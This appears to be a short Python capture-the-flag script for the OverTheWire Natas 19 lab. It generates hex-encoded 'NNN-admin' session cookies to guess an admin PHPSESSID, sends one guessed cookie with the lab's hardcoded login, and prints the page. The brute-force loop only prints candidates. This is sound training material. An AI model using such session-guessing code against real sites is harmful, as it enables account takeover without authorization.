#! env python3.9

import requests

site = "http://natas19.natas.labs.overthewire.org/"
user = "natas19"
pswd = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
nums = "0123456789"

for i in nums:
    for j in nums:
        for k in nums:
            cookie = "{}{}{}-admin".format(i, j, k).encode().hex()
            print(cookie)


cookie_text = "123-admin".encode().hex()
cookies = dict(PHPSESSID=cookie_text)

r = requests.get(site, auth=(user, pswd), cookies=cookies)
print(r.text)

# This gets the page and thinks I have a session so test complete 


